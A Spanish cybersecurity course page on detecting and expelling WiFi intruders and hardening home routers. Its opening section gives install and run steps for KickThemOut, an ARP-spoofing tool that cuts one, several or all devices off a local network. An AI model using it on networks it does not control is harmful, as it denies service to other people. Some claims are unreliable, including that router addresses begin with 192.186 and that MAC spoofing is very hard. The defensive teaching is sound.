# red team

## Identificaci√≥n de usuarios y expulsi√≥n de intrusos

### **¬øC√≥mo expulsar a tu intruso de tu red con kali linux?**

El otro d√≠a me estaba preguntado sobre como expulsar a tu intruso de tu red pero tambi√©n podemos cambiar la contrase√±a de nuestra red pero si lo quieres usarlo para otra cosa tambi√©n te puede ser √∫til. Nuestro m√©todo es dejar sin Internet a nuestro intruso, la herramienta se llama ‚Äù KickThemOut‚Äù

### **¬øQu√© es KickThemOut?**

Una herramienta para expulsar dispositivos de su red y disfrutar de todo el ancho de banda para usted. Le permite seleccionar dispositivos espec√≠ficos o todos los ARP y los spoofs de su red de √°rea local. Compatible con Python 2.6 & 2.7 y permite seleccionar dispositivos espec√≠ficos de la red o todos los dispositivos conectados. Podemos ver su [github para m√°s informaci√≥n](https://github.com/k4m4/kickthemout).

**Instalaci√≥n**

| 1 | sudo apt-get update |
| --- | --- |

> Tambi√©n necesitaremos tener instalado nmap, si no lo tenemos, podemos instalarlo en debian con el comando

| 1 | sudo apt-get install nmap |
| --- | --- |

> Con todo instalado y actualizado, toca descargar la aplicaci√≥n, para ello nos situamos en donde queramos descargarla, y la clonamos desde su repositorio de github con el comando

| 1 | git clone https://github.com/k4m4/kickthemout.git |
| --- | --- |

> Accedemos a la carpeta descargada e instalamos la aplicaci√≥n

| 1
2 | cd kickthemout/
sudo python -m pip install -r requirements.txt |
| --- | --- |

> Ahora ya s√≥lo toca ejecutarla y probarla

| 1 | python kickthemout.py |
| --- | --- |

![Termina1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/terminal1.png?raw=true)

As√≠ ejecutamos el c√≥digo y nos pide 3 opciones.

1. Opci√≥n dejar a Internet a un solo usuario.
2. Dejar sin Internet a uno y m√°s usuarios seleccionados.
3. Dejamos sin Internet a todos.(MALDAD TOTAL)

El funcionamiento es muy sencillo, tan s√≥lo es introducir el n√∫mero de la operaci√≥n que queramos llevar a cabo para llevarlo a cabo. Podemos ver un ejemplo que he parado a mitad, s√≥lo por mostrar el funcionamiento.

![Termina2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/terminal2.png?raw=true)

### **¬øPueden hackearse los routers?**

Si hackean tu equipo, los peligros est√°n claros: un hacker puede acceder a todos tus archivos personales confidenciales e incluso eliminarlos, si lo deseas. Y, una vez que un hacker ha obtenido acceso a tu PC o a su tel√©fono, puede instalar malware para espiar tu actividad en Internet, secuestrar tus archivos mediante ransomware o causar otros da√±os. Por desgracia, **los routers tambi√©n son vulnerables**.

### **¬øCu√°l es el peligro de un router hackeado?**

El peligro cuando se hackea un router es que puede iniciar una serie de amenazas completamente nuevas, desde las aparentemente inocentes hasta otras mucho m√°s serias. Con ese nivel de acceso, alguien que le haya hackeado el router puede:

- **Saturar su ancho de banda:** Esto es m√°s molesto que da√±ino, pero aun as√≠, si alguien est√° usando su conexi√≥n Wi-Fi para el streaming de juegos o pel√≠culas (o incluso para la criptominer√≠a), le quedar√° poco ancho de banda para sus actividades.
- **Espiar su tr√°fico de Internet:** Alguien que haya accedido a su red Wi-Fi puede espiar todo el tr√°fico de la red en cualquier dispositivo que est√© conectado. Esto incluye su PC, su tel√©fono, los PC y tel√©fonos de su familia, su videoconsola, sus dispositivos de hogar inteligente y mucho m√°s. Los hackers tambi√©n pueden usar un sniffer de paquetes para supervisar el tr√°fico de Internet en tiempo real y capturar todos los datos entrantes y salientes.
- **Acceder a contenido ilegal:** Quiz√° usted tenga un historial de Internet impoluto, pero la persona que hackee su Wi-Fi posiblemente no. Pueden usar su conexi√≥n a Internet para ver o subir contenidos multimedia ilegales, transmitir o descargar contenido hackeado, comprar en la web oscura y muchas otras acciones dudosas, todo en su nombre.
- **Recopilar sus datos personales:** Los hackers de routers pueden capturar cualquier dato que introduzca en una p√°gina web con una conexi√≥n no cifrada, es decir, cualquier p√°gina web que solo use HTTP. Y lo mismo le ocurre a cualquier persona que est√© conectada a su red Wi-Fi hackeada. No introduzca nunca datos confidenciales, como las contrase√±as, en una p√°gina web que no tenga cifrado HTTPS.
- **Instalar malware:** S√≠, hay malware para routers. Un hacker con acceso al router puede hackear el firmware del router para cargar malware que abra la puerta a m√°s ataques y espionajes en el futuro.
- **Crear un mapa de su red Wi-Fi:** Las personas que accedan a su router pueden ver todos los dispositivos de la red y usar esa informaci√≥n para planificar m√°s ataques. Los ataques a routers en hogares inteligentes y otros dispositivos de Internet de las cosas pueden ser especialmente peligrosos, ya que no mucha gente presta la misma atenci√≥n a la seguridad de IoT que a la seguridad de su PC y su tel√©fono.
- **Atacar a otras personas:** Los ciberdelincuentes pueden hackear el router y usarlo como parte de un ataque DDOS masivo.
- **Cambiar la configuraci√≥n DNS:** Un objetivo com√∫n de los routers Wi-Fi hackeados es acceder a la configuraci√≥n DNS del router, que determina a d√≥nde se env√≠a el tr√°fico de Internet. Los hackers pueden cambiar la configuraci√≥n DNS del router para redirigir el tr√°fico de Internet a las p√°ginas web que ellos determinen, generalmente p√°ginas web de pharming que le enga√±an para que proporcione sus datos personales o p√°ginas web maliciosas que descargan malware en sus dispositivos.

### **¬øMe han hackeado el router?**

Esperamos que ya haya seguido los consejos anteriores para que el router Wi-Fi est√© libre de hackeos ahora y en el futuro. No obstante, si sospecha que el router Wi-Fi ha sido hackeado o le preocupan estas amenazas, est√© pendiente de estas se√±ales que pueden indicar un hackeo.

- **Internet va mucho m√°s despacio.** Esto puede deberse a muchas razones, de modo que, si no detecta otros s√≠ntomas de esta lista, no tiene que preocuparse necesariamente. No obstante, la lentitud de Internet *s√≠* puede estar causada por un hacker Wi-Fi que consuma todo su ancho de banda.
- **Hay dispositivos desconocidos en el router.** Si est√° usando una herramienta de seguridad de redes Wi-Fi, como Avast Free Antivirus, sabr√° autom√°ticamente si se conecta un dispositivo extra√±o a la red. De lo contrario, tendr√° que iniciar sesi√≥n en el router y revisar la lista de direcciones IP de la red. Cruce esa lista con las direcciones IP de sus dispositivos (consulte aqu√≠ c√≥mo averiguar su direcci√≥n IP) para ver si hay alg√∫n elemento extra√±o.
- **La configuraci√≥n DNS ha cambiado.** Es probable que su router se conecte a un servidor DNS de su proveedor de Internet, pero los hackers pueden cambiar la configuraci√≥n DNS del router para que use un servidor malicioso en su lugar. Esta operaci√≥n puede causar que el tr√°fico web se redirija a p√°ginas web peligrosas para robar sus datos personales o descargar malware en el dispositivo. Puede revisar la configuraci√≥n DNS del router en el men√∫ de administraci√≥n de router.
- **Las credenciales de administraci√≥n o la contrase√±a del router han cambiado.** Un hacker que no intente permanecer oculto podr√≠a cambiar la contrase√±a del router, lo cual le impedir√≠a usar los servicios de Internet que est√° pagando. Tambi√©n puede bloquear su acceso al backend del router cambiando las credenciales de administraci√≥n.
- **Hay software desconocido (o malware) en los dispositivos.** Esta es una se√±al de alarma importante. Un hacker con acceso al router puede infectar sus dispositivos con todo tipo de malware, incluido ransomware.
- Si experimenta uno o varios de estos problemas, siga leyendo para saber c√≥mo impedir que los hackers usen su red Wi-Fi y c√≥mo recuperar el control del router.

### **C√≥mo arreglar un router hackeado**

Si le han hackeado el router, la buena noticia es que seguramente pueda recuperar el control. Si sigue el sencillo procedimiento que explicamos a continuaci√≥n, deber√≠a ser capaz de expulsar a cualquier invasor del router y evitar futuros ataques.

Hay m√°s buenas noticias: Si el router se infecta con malware, este procedimiento tambi√©n deber√≠a eliminarlo.

**1. Desconecte el router**

Debe aislar el router para subsanar hackeos. El primer paso es desconectar todos los cables de Internet del router. De ese modo, se cortar√° inmediatamente la conexi√≥n entre los hackers y los dispositivos de la red Wi-Fi dom√©stica. Si hay dispositivos conectados f√≠sicamente al router, descon√©ctelos tambi√©n.

**2. Restablezca el router**

A continuaci√≥n, restablezca el router a los valores de f√°brica. Tenga en cuenta que esta operaci√≥n *no* es lo mismo que apagar y encender el router para intentar solucionar una conexi√≥n lenta a Internet.

**El restablecimiento de f√°brica borra todos los datos del router, incluidos los ajustes de red que haya configurado.** Si un hacker conoce la contrase√±a de administraci√≥n, no podr√° usarla despu√©s de un restablecimiento. Restablecer el router tambi√©n puede eliminar algunos tipos de malware en el router, incluido el famoso [VPNFilter](https://en.wikipedia.org/wiki/VPNFilter).

La mayor√≠a de los routers tienen un bot√≥n para restablecer los valores de f√°brica. Quiz√° necesite un clip para pulsarlo. Si no logra averiguar c√≥mo restablecer los valores de f√°brica del router, consulte el manual de usuario o la p√°gina web del fabricante del router.

**3. Inicie sesi√≥n en el router y cambie las credenciales de administraci√≥n**

Una vez que haya restablecido los valores de f√°brica, podr√° iniciar sesi√≥n con el nombre de usuario y la contrase√±a predeterminados. Encontrar√° esta informaci√≥n en el propio router, en el manual de usuario o en la p√°gina web del fabricante.

Tras iniciar sesi√≥n, cambie la contrase√±a de administraci√≥n por una personalizada. Esta operaci√≥n evitar√° que los hackers vuelvan a conectarse.

**4. Establezca un nuevo SSID y una nueva contrase√±a para la red Wi-Fi**

D√© a la red inal√°mbrica un nuevo nombre y recuerde que los nombres largos y complejos dificultan el crackeo de la red. Lo mismo ocurre con la contrase√±a: use al menos 15 caracteres y una combinaci√≥n de letras, cifras y s√≠mbolos (o use esta herramienta para crear contrase√±as aleatorias e impenetrables).

**5. Configure una red de invitados (opcional)**

Mientras configura el router, valore la posibilidad de establecer una red Wi-Fi para invitados en el router. Esta es una red adicional que permite a los dispositivos conectados acceder a Internet sin usar la red principal. De ese modo, si el tel√©fono de un amigo est√° infectado con malware, su nuevo e impolutoPC no estar√° en peligro.

Si tiene muchos dispositivos inteligentes, tambi√©n puede dirigirlos a la red para invitados. Los dispositivos IoT generalmente no son muy seguros, de modo que es una buena idea aislarlos en una red independiente.

**6. Actualice el firmware del router**

La mayor√≠a de los routers no actualizan el firmware autom√°ticamente, as√≠ que tendr√° que hacerlo cuando inicie sesi√≥n. Busque la configuraci√≥n del firmware en el men√∫ de administraci√≥n del router y actual√≠celo a la versi√≥n m√°s actual. Los intentos de atacar el antiguo firmware ser√°n ineficaces frente a la nueva actualizaci√≥n.

## **Control y seguridad de redes WiFi**

Hoy en d√≠a, la mayor√≠a de las conexiones son de fibra √≥ptica con velocidades m√°s que suficientes para cubrir las necesidades m√°s exigentes de cualquier familia. Sin embargo, cuando nos conectamos a plataformas de v√≠deo en streaming o descargado contenido, la velocidad restante disponible para el resto de los usuarios se reduce considerablemente. Si, adem√°s, tenemos alg√∫n intruso en nuestra red, la velocidad ser√° a√∫n m√°s reducida y tendremos problemas a la hora de reproducir contenido v√≠a streaming, descargar contenido o incluso acceder a internet.

Afortunadamente, tanto **detectar a intrusos en una red WiFi** como expulsarlos y evitar que vuelvan a conectarse es un proceso muy sencillo a la par que r√°pido, siguiendo los pasos que mostramos a continuaci√≥n.

### **Problemas asociados a que nos roben el WiFi**

Cuando hablamos de que alguien nos pueda robar la se√±al WiFi, lo primero que nos viene a la cabeza es en la **p√©rdida de velocidad** que experimentar√° nuestra conexi√≥n, una p√©rdida que, dependiendo de la velocidad que tengamos contratada, puedes ser m√°s o menos apreciable, sin embargo, no es el √∫nico motivo por el que debemos comprobar si tenemos alg√∫n intruso en nuestra red, ya que podemos tener problemas de la m√°s diversa √≠ndole.

Si compartimos contenido a trav√©s de nuestra red local desde nuestro PC, si tenemos alg√∫n intruso, √©ste podr√° acceder a todo ese contenido y, si tiene permisos totales, podr√° **borrar todo el contenido** adem√°s de descargarlo en su equipo. Esto es especialmente grave cuando compartimos una carpeta donde almacenamos todos los documentos que utilizamos tanto en el trabajo como en los estudios como a nivel personal, como nuestras finanzas, contrase√±as y dem√°s.

Cualquier dispositivo que se conecte a internet a trav√©s de nuestra conexi√≥n, dejar√° el rastro de nuestra IP. De esta forma, si realiza cualquier actividad ilegal, el **responsable** de cara a las autoridades de orden p√∫blico seres nosotros, aunque posteriormente a trav√©s del router, se pueda comprobar que realmente no hemos sido nosotros a trav√©s de los diferentes dispositivos que utilicemos, cabiendo la posibilidad de que las autoridades consideren que nos hemos deshecho del dispositivo utilizado.

Si la persona que se ha conectado a nuestra red tiene amplios conocimientos de inform√°tica y su √∫nica finalidad no es la de utilizar nuestra se√±al de internet de forma gratuita sino la de robar informaci√≥n personal como las **claves de acceso al banco** (una operaci√≥n muy sencilla utilizando programas que capturan y analizan los datos que circulan por la red) el problema puede ser mucho m√°s importante de lo que podr√≠amos imaginar en un principio.

<aside>
üí° Tambi√©n corremos el riesgo de quedarnos sin internet. Una vez que el intruso accede a nuestro router, puede acceder f√°cilmente al router, especialmente si se trata de un modelo gen√©rico y cambiar la contrase√±a de nuestra se√±al WiFi expulsando a todos los dispositivos que tengamos conectados.
</aside>

## **Detectar intrusos en una red WiFi**

En los √∫ltimos a√±os, Microsoft ha implementado un gran n√∫mero de funciones de forma nativa que permiten a los usuarios realizan las mismas funciones para las que anteriormente era necesario utilizar una aplicaci√≥n de terceros. Un claro ejemplo lo encontramos en Microsoft Defender, el antivirus nativo de Windows. Sin embargo, al no ser una necesidad habitual para la mayor√≠a de los usuarios, aunque realmente no es as√≠, no incluye la posibilidad de conocer cu√°les son todos los dispositivos conectados a nuestra red, ya sea v√≠a WiFi o a trav√©s de un cable ethernet.

Para detectar intrusos en una red, tenemos dos opciones. Por un lado, podemos acceder a la configuraci√≥n del router y por otro, utilizar aplicaciones de terceros. Pero, antes de nada, debemos saber qu√© es lo que tenemos que buscar y c√≥mo identificar los dispositivos. Cuando un dispositivo se conecta a un router, este almacena le asigna autom√°ticamente una direcci√≥n IP que le permite acceder a la red. Esa informaci√≥n se almacena en un registro, registro donde tambi√©n se almacena la direcci√≥n MAC (la matr√≠cula del dispositivo) y el nombre del dispositivo (aunque esta informaci√≥n no siempre es capaz de identificarla).

### **Desde el router**

El router incluye un registro donde se almacenan todos los dispositivos que se han conectado al dispositivo, informaci√≥n que incluye la IP asignada, la MAC y su nombre. Los datos de acceso al router se encuentran en la parte inferior del dispositivo. La direcci√≥n que debemos introducir siempre empieza por 192.186 seguido por otros dos n√∫meros. El nombre de usuario y la contrase√±a, tambi√©n se encuentran en la parte inferior del router. Algunos router, desde la p√°gina principal nos muestra el n√∫mero de dispositivos conectados v√≠a WiFi y utilizando un cable ethernet. Para conocer los equipos conectados v√≠a WiFi, tan solo debemos pulsar en **Wi-Fi devices** o **dispositivos WiFi**.

![router1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/router1.png?raw=true)

A continuaci√≥n, se mostrar√°n un listado con todos los dispositivos conectados v√≠a WiFi. Algunos dispositivos se mostrar√°n junto con el nombre que tienen configurado, pero no todos. Junto al nombre del dispositivo, si este est√° disponible, se muestra la direcci√≥n IP en la red local y la direcci√≥n MAC (compuesta por 6 bloques de 2 cifras que combinan letras y n√∫meros), si se encuentran activos en la red y desde cuanto tiempo se encuentran conectados de forma continuada.

![router2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/router2.png?raw=true)

<aside>
üìñ Si no encontramos esta opci√≥n en los men√∫s del router, debemos **consultar a nuestro operador** o buscar en internet el manual de nuestro router. Los pasos para acceder a este apartado var√≠an dependiendo del fabricante del router y del operador.
</aside>

### **Utilizando aplicaciones de terceros**

Si no queremos lidiar con los diferentes men√∫s que incluyen algunos router, ya que algunos est√°n en ingl√©s, podemos utilizar aplicaciones de terceros como las que mostramos a continuaci√≥n. Sin embargo, la informaci√≥n **m√°s fiable y completa** √∫nicamente la vamos a encontrar directamente a trav√©s de nuestro router.

- **Advanced IP Scanner**

Avanced IP Scanner es una aplicaci√≥n gratuita con la que podemos conocer r√°pida y f√°cilmente todos los dispositivos que se encuentran conectados a nuestra red Wi-Fi. La informaci√≥n que nos muestra es la misma que la podemos obtener accediendo a trav√©s del router, y donde podemos ver el nombre del dispositivo, la IP asignada, el fabricante del dispositivo y la direcci√≥n MAC. Podemos descargar Advanced IP Scanner directamente desde su [p√°gina web](https://www.advanced-ip-scanner.com/es/).

![IP Scanner 1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/ip-scanner1.png?raw=true)

- **Angry IP Scanner**

Otra aplicaci√≥n con la que tambi√©n podemos analizar los dispositivos conectados a nuestro equipo es Angry IP Scanner, una aplicaci√≥n disponible para su descarga de forma totalmente gratuita y que adem√°s de para **Windows**, tambi√©n est√° disponible para **Linux** y **macOS**.

La descarga de Angry IP Scanner est√° disponible a trav√©s de su p√°gina web a la que podemos acceder pulsando [aqu√≠](https://angryip.org/download/#windows).

![IP Scanner 2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/ip-scanner2.png?raw=true)

## **C√≥mo expulsar usuarios de una conexi√≥n WiFi**

El m√©todo m√°s sencillo y r√°pido para expulsar a cualquier persona que haya accedido a nuestra red Wi-Fi es cambiar la contrase√±a de la se√±al o se√±ales Wi-Fi, si adem√°s de la red de 2.4 GHz tambi√©n tenemos habilitada la red de 5 GHz (Plus como lo denominan algunos proveedores). Para cambiar la contrase√±a, el proceso var√≠a dependiendo del fabricante y del operador, debemos acceder al router (recordemos que los datos se encuentran en la parte inferior del mismo) y acceder al apartado Wi-Fi. A continuaci√≥n, nos dirigimos a cada una de las dos se√±ales Wi-Fi (si tenemos m√°s de una), las podemos identificar por el nombre que muestran y modificamos la contrase√±a por cualquier otra.

![conexi√≥n WiFi](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/conexion-wifi.png?raw=true)
Debemos evitar utilizar el nombre de nuestro hijo junto con su fecha de nacimiento, el nombre de alguna de nuestras mascotas, alg√∫n apodo por √©l nos conozca o cualquier otro dato que f√°cilmente puedan conocer las personas que nuestro entorno que est√©n buscando una conexi√≥n a internet gratuita. Adem√°s, si disponemos de la opci√≥n, podemos **ocultar la red Wi-Fi** para que no se muestre entorno. De esta forma, los dispositivos ya conectados podr√°n seguir conect√°ndose, pero no estar√° disponible en ning√∫n otro dispositivo que queramos conectar. Si queremos conectar un nuevo dispositivo, podemos desmarcar la casilla, conectarlo y volver a ocultar la red.

### **C√≥mo evitar que se vuelvan a conectar**

Una vez hemos expulsado a los intrusos de nuestra red WiFi, llega el momento de tomar las medidas adecuadas para evitar que se nos vuelva a colar cualquier persona.

1. **Utilizar contrase√±a segura**

A la hora de elegir una contrase√±a, debemos olvidarnos de utilizar cualquier nombre que pueda estar asociado a nosotros en particular o a nuestra familia. Al igual que tampoco debemos utilizar los nombres de nuestras mascotas, ni fechas de nacimiento en combinaci√≥n con nombres. Tampoco utilizar nombres comunes de marcas conocidas que nos pueda gustar, ni marcas de coches, dise√±adores de moda, marcas de ropa, equipos de f√∫tbol o jugadores‚Ä¶ La contrase√±a m√°s segura es aquella que est√° formada por **letras, n√∫meros y s√≠mbolos** de forma aleatoria y combinando may√∫sculas y min√∫sculas.

Las aplicaciones que permiten acceder a redes Wi-Fi, utilizan diccionarios con palabras clave que se utilizan de forma nativa en la mayor√≠a de los routers, por lo que, si nuestro router ya viene con una contrase√±a asociada al router, lo primero que debemos hacer es cambiarla y crear una nueva, contrase√±a que, con muchos a√±os por delante y a trav√©s de aplicaciones de fuerza bruta, las aplicaciones dise√±adas para este fin pueden averiguar.

2. **Ocultar la red Wi-Fi**

Otro interesante m√©todo que tenemos disponible para evitar que los amigos de lo ajeno accedan a nuestra contrase√±a Wi-Fi pasa por ocultar la se√±al en nuestro entorno. Una vez hemos conectado todos los dispositivos a la red Wi-Fi nuevamente despu√©s de haber cambiado la clave si se diera el caso, desde el router, podemos ocultar la red Wi-Fi para que ning√∫n otro dispositivo que se encuentre en su entorno, pueda **detectar su presencia** e intentar averiguar la contrase√±a utilizando diferentes m√©todos, aunque llegue a conocer la contrase√±a, si no puede acceder a la se√±al, nunca podr√° tener la oportunidad de introducirla.

3. **Activar la identificaci√≥n MAC**

El √∫ltimo m√©todo que tambi√©n tenemos a nuestra disposici√≥n para evitar que otras personas de nuestro entorno accedan a nuestra conexi√≥n es configurar el router para que √∫nicamente acepte las conexiones de las direcciones MAC que previamente hemos introducido. Cualquier equipo que trate de conectarse a nuestra red, conociendo la contrase√±a, si no tiene registrada su direcci√≥n MAC **nunca podr√° acceder al contenido** que ofrece el router, es decir, ni a la se√±al de internet ni a los archivos, carpetas o cualquier otro contenido compartido. La direcci√≥n MAC, es la matr√≠cula que tienen los dispositivos con conexi√≥n a internet, una matr√≠cula √∫nica e irrepetible para cada dispositivo. Si bien es cierto que se puede falsear, es proceso muy complicado de hacer y realmente no merece la pena.

## **¬øC√≥mo proteger su red Wi-Fi frente a hackers?**

Con unas sencillas precauciones en su router Wi-Fi, lograr√° que sea mucho m√°s dif√≠cil hackearlo. Al igual que en muchos aspectos de la vida, evitar los hackeos en la red Wi-Fi es m√°s f√°cil y barato que enfrentarse a un router hackeado. Una vez que esto sucede, el problema se vuelve significativamente m√°s dif√≠cil de resolver, aunque no imposible.

Es muy diferente si hemos visto **intrusos en nuestra red Wi-Fi** que desconocemos, o si por el contrario es un usuario o dispositivo que no queremos que se conecte a la red, pero que en alg√∫n momento le dimos permiso. Puede que sea alguien que ha venido a nuestra casa y le hemos dado la clave del Wi-Fi, por ejemplo. Sea como sea, tenemos diferentes opciones para evitar que un usuario en concreto o un dispositivo se conecten a nuestra red. Vamos a hablar de las principales que tenemos.

1. **Cambie las credenciales de administrador del router**

Todos los routers tienen un nombre de usuario y una contrase√±a para acceder a la configuraci√≥n del router. Cuando consigue un router, ya sea nuevo o usado, **cambie inmediatamente el nombre de usuario y la contrase√±a**.

Los hackers de redes Wi-Fi conocen las credenciales de administraci√≥n predeterminadas de pr√°cticamente todos los routers habituales del mercado. Si alguien puede acceder a su red Wi-Fi, pueden intentar conectarse a su router con esos datos. Si nunca ha actualizado las credenciales de inicio de sesi√≥n tras obtener el router, resulta sencillo hackear la contrase√±a del router. Y, si ha comprado el router a otra persona, no puede estar seguro de la antig√ºedad de esos datos. En cualquier caso, c√°mbielos lo antes posible.

Establezca una nueva contrase√±a del router mediante [pr√°cticas para crear una contrase√±a segura](https://blog.avast.com/strong-password-ideas) o [cree una contrase√±a imposible de averiguar](https://www.avast.com/es-es/random-password-generator) con una cadena aleatoria de caracteres para impedir que los hackers de redes Wi-Fi accedan a su router.

2. **Cambiar la contrase√±a de la red Wi-Fi**

Sin duda la mejor opci√≥n de echar a cualquier usuario de nuestra red es **cambiar la contrase√±a del Wi-Fi**. As√≠, cualquier usuario o dispositivo que estuviera conectado a nuestra red, autom√°ticamente queda fuera. Eso s√≠, en este caso hay que tener en cuenta que no solo quedar√≠a fuera un usuario en concreto, sino que tambi√©n pasar√≠a con cualquier otro equipo conectado o usuario. Tendr√≠amos que volver a configurar la nueva clave o cifrado en cada caso.

Siempre que creemos una nueva clave hay que seguir el mismo patr√≥n para que sea **fuerte y compleja**: tiene que contener letras (may√∫sculas y min√∫sculas), n√∫meros y otros caracteres especiales, es recomendable que sea de 12 caracteres o superior, y si es posible, que sea aleatoria.

3. **Crear un filtrado MAC**

Crear un **filtrado MAC** por s√≠ solo no va a mejorar en gran medida la seguridad de nuestra red inal√°mbrica, pero podr√≠a hacer que un usuario o dispositivo en concreto no puedan conectarse. Es, por tanto, una de las opciones que tenemos para expulsar usuarios de nuestro Wi-Fi. Especialmente podremos echar a aquellos que cuenten con menos conocimientos, que simplemente hayan entrado porque han averiguado la contrase√±a por alg√∫n motivo.

Para ello tenemos que identificar la direcci√≥n MAC de ese usuario. Podemos **entrar en el router**, al cual generalmente se accede a trav√©s de la puerta de enlace predeterminada 192.168.1.1 e introducir las credenciales. Si no sabemos cu√°l es la puerta de enlace la podemos averiguar f√°cilmente. Tenemos que ir a Inicio, abrimos el S√≠mbolo del sistema y posteriormente ejecutamos el comando ipconfig. Nos mostrar√° una serie de datos entre los que se encuentran lo que nos interesa. As√≠ ya podremos acceder a nuestro dispositivo.

![filtrado MAC](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/filtrado-mac.png?raw=true)

La contrase√±a suele ser gen√©rica del tipo admin123, 1234, etc. No obstante, es muy recomendable que nunca dejemos esa clave de acceso y que la cambiemos por otra mucho m√°s fuerte que pueda mantener alejados a los ciberdelincuentes¬† y que no comprometan nuestra seguridad en ning√∫n momento. El proceso depender√° del router que tengamos, pero en general habr√° que entrar en Wireless y acceder a la opci√≥n de filtro de direcciones MAC.

Aqu√≠ tendremos que **introducir la direcci√≥n MAC** de ese dispositivo que queremos evitar que se conecte. Puede ser de alguien a quien le dimos en alg√∫n momento nuestra contrase√±a o incluso un equipo de nuestra propiedad que no queramos que tenga acceso a la red. Podemos crear una lista blanca para que √∫nicamente los dispositivos que queramos puedan acceder f√°cilmente.

4. **Active el cifrado WPA2 (o WPA3)**

WPA2 y WPA3, las versiones segunda y tercera del protocolo de seguridad Wi-Fi Protected Access, protegen su router frente a accesos no autorizados mediante cifrado AES. Este es el mismo tipo de cifrado que usamos en Avast para nuestra Avast SecureLine VPN supersegura, as√≠ que puede imaginarse que es algo bueno. Todos los routers que merecen la pena tienen activado el cifrado WPA2 y los modelos m√°s modernos podr√≠an tener WPA3.

Active el cifrado WPA2 o WPA3 para requerir que cualquier persona que desee conectarse a su router protegido use la contrase√±a Wi-Fi. Adem√°s, aseg√∫rese de crear una contrase√±a segura siguiendo pr√°cticas inteligentes para crear contrase√±as seguras. Estos sencillos pasos supondr√°n un obst√°culo serio para cualquier hacker de redes Wi-Fi.

5. **Cambie el nombre de red del router (SSID)**

Cuando configure el router (para cambiar sus credenciales de administraci√≥n y establecer una contrase√±a segura), cambie tambi√©n el SSID. SSID son las siglas de *service set identifier*, que, en pocas palabras, es el nombre de su red Wi-Fi.

Los routers nuevos a menudo incluyen la marca del router en el SSID y los hackers de redes Wi-Fi pueden usar esta informaci√≥n para crackear su contrase√±a. En su lugar, **personalice el nombre de la red** para que no sepan el tipo de router que tiene. Cuantas m√°s pistas d√© a un hacker, m√°s f√°cil ser√° su trabajo.

Use toda su creatividad con el nombre de la red Wi-Fi: cree una larga y compleja. El cifrado WPA usa el SSID como parte de su algoritmo, de modo que, si evita nombres de red habituales o comunes, conseguir√° que la red sea m√°s resistente frente a m√©todos de hackeo de la contrase√±a, como las tablas arco√≠ris. Adem√°s, est√° bien dejar que los vecinos lean algo gracioso.

6. **Desactive WPS**

Adem√°s de WPA2 o WPA3, muchos routers tambi√©n tienen WPS (Wi-Fi Protected Setup), lo cual significa que puede apretar un bot√≥n o introducir un PIN para conectarse, en lugar de usar la contrase√±a. Aunque claramente es m√°s c√≥modo, el nivel de seguridad se desploma cuando usa botones o c√≥digos PIN en lugar de contrase√±as.

Cualquier persona que pueda tocar f√≠sicamente el router tambi√©n podr√° pulsar el bot√≥n WPS y conectarse. Y un PIN corto es mucho m√°s f√°cil de crackear en un ataque por fuerza de bruta que una contrase√±a larga y complicada.

Desafortunadamente, no todos los routers permiten desactivar las funciones WPS, pero, si puede, **desactive WPS lo antes posible y establezca una contrase√±a**.

7. **Desactive la administraci√≥n remota o inal√°mbrica**

La administraci√≥n remota permite conectarse a la configuraci√≥n de administraci√≥n del router desde cualquier parte del mundo. Pero, a menos que sea un desarrollador, hay muy pocas probabilidades de que use esta funci√≥n. Si la desactiva, solo podr√° acceder a la configuraci√≥n cuando el PC est√© f√≠sicamente conectado al router mediante un cable Ethernet. Desactivar la administraci√≥n remota es una manera c√≥moda de evitar a los hackers.

8. **Actualice el firmware del router**

El firmware es el software que controla una pieza de hardware espec√≠fica (en este caso, el router). Al igual que el sistema operativo del PC y los programas o aplicaciones que usa, el firmware puede actualizarse. Las actualizaciones de firmware pueden proteger el router frente a cualquier [vulnerabilidad](https://www.avast.com/es-es/c-exploits) que se detecte en versiones antiguas del firmware. Algunos routers pueden buscar actualizaciones del firmware, pero siempre puede iniciar sesi√≥n en la configuraci√≥n de administraci√≥n del router, buscar la secci√≥n del firmware y buscar actualizaciones ah√≠.

9. **Use una herramienta de ciberseguridad que proteja la red Wi-Fi**

Una de las maneras m√°s f√°ciles y sencillas para proteger la red Wi-Fi es usar una herramienta de supervisi√≥n de la red Wi-Fi para que no tenga que molestarse en vigilar la red manualmente. Avast Free Antivirus incluye un Inspector de Wi-Fi que analiza constantemente la red en busca de actividades o dispositivos sospechosos, de manera que sabr√° qu√© ocurre exactamente en su red Wi-Fi en todo momento.

![red Wi-Fi](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/red-wi-fi.png?raw=true)

10. **Restablecer los valores del router**

Un poco **similar al cambio de contrase√±a** que mencion√°bamos anteriormente. Si reseteamos el router y volvemos a los valores de f√°brica, en caso de que hayamos cambiado previamente la clave y la configuraci√≥n, todos los usuarios quedan fuera del mismo. A fin de cuentas no conocer√≠an las nuevas credenciales y la configuraci√≥n no les permitir√≠a seguir conectados. Es una manera r√°pida de **expulsar a cualquier usuario**. Eso s√≠, una vez m√°s estar√≠amos bloqueando el acceso a todos los dem√°s usuarios y dispositivos. Tendr√≠amos que generar una nueva clave segura.

11. **Deshabilitar el Wi-Fi**

Esta opci√≥n autom√°ticamente va a dejar fuera a todos los usuarios que se conecten a trav√©s de la red inal√°mbrica. Va a permitir que echemos a cualquier equipo que tengamos conectado. Sin embargo esto solo ser√≠a v√°lido si no vamos a querer utilizar el Wi-Fi. Por ejemplo si vamos a conectarnos por cable y lo √∫nico que queremos es que no haya m√°s aparatos que puedan conectarse. Es una medida m√°s dr√°stica pero que tambi√©n hemos querido incluir. A fin de cuentas es una soluci√≥n que tambi√©n podemos llevar a cabo en un momento dado.

Para ello tendremos que entrar de nuevo al router. Podemos acceder a la configuraci√≥n avanzada, entrar en Wi-Fi y, seg√∫n nuestro modelo, encontrar la opci√≥n correspondiente para **deshabilitar la red inal√°mbrica**. En cualquier momento podremos revertir la situaci√≥n. Incluso puede ayudarnos a ganar tiempo mientras cambiamos la contrase√±a o llevamos a cabo cualquier cambio.

